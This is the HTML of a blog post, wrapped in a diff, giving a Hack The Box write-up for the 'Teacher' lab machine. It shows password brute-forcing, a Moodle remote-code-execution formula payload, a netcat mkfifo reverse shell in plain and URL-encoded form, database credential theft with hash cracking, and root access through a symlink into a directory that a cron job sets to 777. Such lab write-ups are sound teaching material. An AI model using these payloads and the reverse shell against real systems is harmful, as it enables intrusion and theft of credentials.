@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Teacher | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Hack The Box - Teacher" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My write-up for Teacher from Hack The Box." />
+<meta property="og:description" content="My write-up for Teacher from Hack The Box." />
+<link rel="canonical" href="https://0xrick.github.io/hack-the-box/teacher/" />
+<meta property="og:url" content="https://0xrick.github.io/hack-the-box/teacher/" />
+<meta property="og:site_name" content="0xRick" />
+<meta property="og:image" content="https://0xrick.github.io/hackthebox/teacher/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-04-20T00:00:00+02:00" />
+<script type="application/ld+json">
+{"description":"My write-up for Teacher from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/teacher/","image":"https://0xrick.github.io/hackthebox/teacher/0.png","headline":"Hack The Box - Teacher","dateModified":"2019-04-20T00:00:00+02:00","datePublished":"2019-04-20T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/teacher/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
+
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Teacher</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/php/">php</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 20 Apr 2019</div>
+  
+  <div class="post-description">My write-up for Teacher from Hack The Box.</div>
+  
+  <hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to <code class="highlighter-rouge">/root</code> or anything else we want to access. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.153</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">teacher.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/teacher/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with nmap to scan for open ports and services : 
+<code class="highlighter-rouge">nmap -sV -sT -sC teacher.htb</code>
+<img src="/images/hackthebox/teacher/1.png" alt="" />
+<br /> We only see http running on port 80. Let’s see what’s in there.
+<br /></p>
+<hr />
+
+<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
+<p><img src="/images/hackthebox/teacher/2.png" alt="" />
+<br /> There is just a static website titled <code class="highlighter-rouge">Blackhat highschool</code> , I looked into other pages like <code class="highlighter-rouge">Courses</code> , <code class="highlighter-rouge">Students</code> etc… And also checked their source code. And on <code class="highlighter-rouge">Gallery</code> : 
+<img src="/images/hackthebox/teacher/3.png" alt="" />
+<br /> I found this line in the source :
+<img src="/images/hackthebox/teacher/4.png" alt="" />
+<br /> for <code class="highlighter-rouge">&lt;img src="images/5.png"&gt;</code> there is an <code class="highlighter-rouge">onerror</code> attribute to print <code class="highlighter-rouge">That's an F</code> in the console. So I checked the console : 
+<img src="/images/hackthebox/teacher/5.png" alt="" />
+<br /> Weird let’s check that image. <code class="highlighter-rouge">http://teacher.htb/images/5.png</code> :
+<img src="/images/hackthebox/teacher/6.png" alt="" />
+<br /> Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all :
+<code class="highlighter-rouge">curl http://teacher.htb/images/5.png</code>
+<img src="/images/hackthebox/teacher/7.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hi Servicedesk,
+
+I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.                                                 
+
+Could you guys figure out what the last charachter is, or just reset it?                                                                   
+
+Thanks,
+Giovanni
+</code></pre></div></div>
+<p><br /> Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with <code class="highlighter-rouge">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> in the background and got some results , one of them was <code class="highlighter-rouge">/moodle</code>. 
+<code class="highlighter-rouge">http://teacher.htb/moodle</code>
+<img src="/images/hackthebox/teacher/8.png" alt="" /></p>
+<blockquote>
+  <p>Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License  -<a href="https://en.wikipedia.org/wiki/Moodle">Wikipedia</a></p>
+</blockquote>
+
+<p><br /> On the login page there’s a guest login :
+<img src="/images/hackthebox/teacher/9.png" alt="" />
+<br /> However I couldn’t achieve anything from that guest login.
+<br /></p>
+<hr />
+
+<h2 id="bruteforcing-the-last-character">Bruteforcing the last character</h2>
+<p><br /> We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password.
+<br /> <code class="highlighter-rouge">for i in {a..z}; do echo Th4C00lTheacha$i; done &gt; list.txt</code> this will print all the letters next to <code class="highlighter-rouge">Th4C00lTheacha</code>
+<br /> Then I added some special chars manually like <code class="highlighter-rouge">!@#$%^&amp;*()_-+=.?/\</code> and finally I added numbers : <code class="highlighter-rouge">for i in {0..9}; do echo Th4C00lTheacha$i; done &gt;&gt; list.txt</code>
+<br /> <code class="highlighter-rouge">list.txt</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Th4C00lTheachaa
+Th4C00lTheachab
+Th4C00lTheachac
+Th4C00lTheachad
+Th4C00lTheachae
+Th4C00lTheachaf
+Th4C00lTheachag
+Th4C00lTheachah
+Th4C00lTheachai
+Th4C00lTheachaj
+Th4C00lTheachak
+Th4C00lTheachal
+Th4C00lTheacham
+Th4C00lTheachan
+Th4C00lTheachao
+Th4C00lTheachap
+Th4C00lTheachaq
+Th4C00lTheachar
+Th4C00lTheachas
+Th4C00lTheachat
+Th4C00lTheachau
+Th4C00lTheachav
+Th4C00lTheachaw
+Th4C00lTheachax
+Th4C00lTheachay
+Th4C00lTheachaz
+Th4C00lTheacha!
+Th4C00lTheacha@
+Th4C00lTheacha#
+Th4C00lTheacha$
+Th4C00lTheacha%
+Th4C00lTheacha^
+Th4C00lTheacha&amp;
+Th4C00lTheacha*
+Th4C00lTheacha(
+Th4C00lTheacha)
+Th4C00lTheacha_
+Th4C00lTheacha-
+Th4C00lTheacha+
+Th4C00lTheacha=
+Th4C00lTheacha.
+Th4C00lTheacha?
+Th4C00lTheacha/
+Th4C00lTheacha\
+Th4C00lTheacha0
+Th4C00lTheacha1
+Th4C00lTheacha2
+Th4C00lTheacha3
+Th4C00lTheacha4
+Th4C00lTheacha5
+Th4C00lTheacha6
+Th4C00lTheacha7
+Th4C00lTheacha8
+Th4C00lTheacha9
+</code></pre></div></div>
+<p><br /> Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder :
+<img src="/images/hackthebox/teacher/10.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/11.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/12.png" alt="" />
+<br /> After it’s finished , all the responses were 870 bytes in length except the response of the payload <code class="highlighter-rouge">Th4C00lTheacha#</code>.
+<img src="/images/hackthebox/teacher/13.png" alt="" />
+<br /> So probably this is the right password , let’s check.
+<img src="/images/hackthebox/teacher/14.png" alt="" />
+<br /> It worked and now we are in as <code class="highlighter-rouge">Giovanni</code>
+<br /></p>
+<hr />
+
+<h2 id="rce--initial-shell-as-www-data">RCE , Initial Shell as <code class="highlighter-rouge">www-data</code></h2>
+<p><br /> After some enumeration I didn’t find anything interesting , so I searched on Google and found this <a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">article</a>. Let’s try to reproduce that vulnerability.
+<br /> First , we will go to the <code class="highlighter-rouge">Algebra</code> course :
+<img src="/images/hackthebox/teacher/15.png" alt="" />
+<br /> Then we will turn editing on :
+<img src="/images/hackthebox/teacher/16.png" alt="" />
+<br /> Now we can edit the course , so we will choose any topic and click on <code class="highlighter-rouge">Add an activity or resource</code> and we will choose <code class="highlighter-rouge">Quiz</code> :
+<img src="/images/hackthebox/teacher/17.png" alt="" />
+<br /> Then we will just fill in the required information :
+<img src="/images/hackthebox/teacher/18.png" alt="" />
+<br /> And click on <code class="highlighter-rouge">Save and display</code>.
+<img src="/images/hackthebox/teacher/19.png" alt="" />
+<br /> After that we will click on <code class="highlighter-rouge">edit quiz</code> :
+<img src="/images/hackthebox/teacher/20.png" alt="" />
+<br /> And add a new question. Question type will be <code class="highlighter-rouge">Calculated</code> :
+<img src="/images/hackthebox/teacher/21.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/22.png" alt="" />
+<br /> Again we will fill in the required information :
+<img src="/images/hackthebox/teacher/23.png" alt="" />
+<br /> And finally we reach the actual exploitation , we will set the answer formula to :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*{a*/`$_GET[0]`;//{x}}`
+</code></pre></div></div>
+<p><img src="/images/hackthebox/teacher/24.png" alt="" />
+<br /> This will allow us to pass system commands through a url parameter called <code class="highlighter-rouge">0</code> , More info about how the exploit is working can be found in the previously mentioned article.
+<br /> After saving the changes we will get this page : 
+<img src="/images/hackthebox/teacher/25.png" alt="" />
+<br /> We will click on <code class="highlighter-rouge">Next Page</code> to finally get to the vulnerable page :
+<img src="/images/hackthebox/teacher/26.png" alt="" />
+<br /> Let’s add the parameter <code class="highlighter-rouge">0</code> and get a reverse shell :
+<br /> Shell : <code class="highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</code>
+<img src="/images/hackthebox/teacher/27.png" alt="" />
+<br /> Note : the payload is url encoded. So final payload will be : <code class="highlighter-rouge">&amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+ip+port+&gt;/tmp/f</code>
+<br /> After sending the request , our listener gets a callback. And we get a reverse shell as <code class="highlighter-rouge">www-data</code> :
+<img src="/images/hackthebox/teacher/28.png" alt="" />
+<br /> There is only <code class="highlighter-rouge">giovanni</code> on the box and we can’t access his <code class="highlighter-rouge">/home</code> directory as <code class="highlighter-rouge">www-data</code>.
+<img src="/images/hackthebox/teacher/29.png" alt="" /></p>
+<hr />
+
+<h2 id="hardcoded-database-credentials--privilege-escalation-to-giovanni">Hardcoded Database Credentials , Privilege Escalation to <code class="highlighter-rouge">giovanni</code></h2>
+<p><br /> Back to <code class="highlighter-rouge">/var/www/html/moodle</code> , I wanted to check config files and other stuff to see if there are any information that can help. And in <code class="highlighter-rouge">config.php</code> I found database credentials :
+<img src="/images/hackthebox/teacher/30.png" alt="" />
+<br /> Sweet , Let’s see what’s in there.
+<code class="highlighter-rouge">mysql -h 127.0.0.1 -u root -p</code>
+<img src="/images/hackthebox/teacher/31.png" alt="" />
+<br /> We are not in any database <code class="highlighter-rouge">[(none)]</code> , Let’s list the databases :
+<code class="highlighter-rouge">SHOW DATABASES;</code>
+<img src="/images/hackthebox/teacher/32.png" alt="" />
+<br /> <code class="highlighter-rouge">moodle</code> is interesting and might have some passwords.
+<code class="highlighter-rouge">USE moodle;</code>
+<img src="/images/hackthebox/teacher/33.png" alt="" />
+<br /> Now let’s check the tables :
+<code class="highlighter-rouge">SHOW TABLES;</code>
+<img src="/images/hackthebox/teacher/34.png" alt="" />
+<br /> A lot of tables , but an interesting one is called <code class="highlighter-rouge">mdl_user</code> :
+<img src="/images/hackthebox/teacher/35.png" alt="" />
+<br /> Alright , let’s see what’s in that table :
+<code class="highlighter-rouge">SELECT * from mdl_user;</code>
+<img src="/images/hackthebox/teacher/36.png" alt="" />
+<br /> We didn’t get the best output :D but anyway I looked into it and found this <code class="highlighter-rouge">md5</code> hash :
+<img src="/images/hackthebox/teacher/37.png" alt="" />
+<br /> And its name is <code class="highlighter-rouge">Giovannibak</code> , probably a backup for giovanni’s password. <a href="https://crackstation.net/">crackstation</a> was able to crack it :
+<img src="/images/hackthebox/teacher/38.png" alt="" />
+<br /> The password is <code class="highlighter-rouge">expelled</code>, we can <code class="highlighter-rouge">su</code> to <code class="highlighter-rouge">giovanni</code>
+<img src="/images/hackthebox/teacher/39.png" alt="" />
+<br /> Now we own user.
+<br /></p>
+<hr />
+
+<h2 id="777-ability-to-read--write-and-execute-anything-on-the-system"><code class="highlighter-rouge">777</code>. Ability to read , write and execute anything on the system</h2>
+<p><br /> In giovanni’s <code class="highlighter-rouge">/home</code> directory there is a directory called <code class="highlighter-rouge">work</code> which has two directories <code class="highlighter-rouge">courses</code> and <code class="highlighter-rouge">tmp</code>. Nothing Special.
+<img src="/images/hackthebox/teacher/40.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/41.png" alt="" />
+<br /> After a lot of enumeration I found in <code class="highlighter-rouge">/usr/bin</code> a script called <code class="highlighter-rouge">backup.sh</code> :
+<img src="/images/hackthebox/teacher/42.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/43.png" alt="" />
+<br /> We don’t really care about the <code class="highlighter-rouge">tar</code> commands , What we care about is that it’s changing current directory to <code class="highlighter-rouge">/home/giovanni/work</code> then changes it once again to <code class="highlighter-rouge">/home/giovanni/work/tmp</code> then changes permissions to <code class="highlighter-rouge">777</code> recursively. This means that any user can read , write and execute any file in <code class="highlighter-rouge">/home/giovanni/work/tmp</code>. So if we created a symlink for <code class="highlighter-rouge">/root</code> in <code class="highlighter-rouge">/home/giovanni/work/tmp</code> and wait for the script to get executed by root (cronjob) we will have access to <code class="highlighter-rouge">/root</code>. In normal conditions creating a symlink to <code class="highlighter-rouge">/root</code> won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since the script runs <code class="highlighter-rouge">chmod 777</code> on <code class="highlighter-rouge">/home/giovanni/work/tmp</code> recursively, Anyone has access to what’s in there even symlinks. This <a href="https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/">article</a> explains it very well. Read <a href="https://stackabuse.com/symbolic-links-in-unix-linux/">this</a> if you don’t know what’s a symlink.
+<br /> Alright , Let’s create a symlink for <code class="highlighter-rouge">/root</code> in <code class="highlighter-rouge">/home/giovanni/work/tmp</code>
+<code class="highlighter-rouge">ln -s /root ./tmp</code>
+<img src="/images/hackthebox/teacher/44.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/45.png" alt="" />
+<br /> And we owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/redcross/">Hack The Box - RedCross</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/irked/">Hack The Box - Irked</a></p>
+<hr />
+
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/onetwoseven/">
+            Hack The Box - OneTwoSeven
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>All Tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
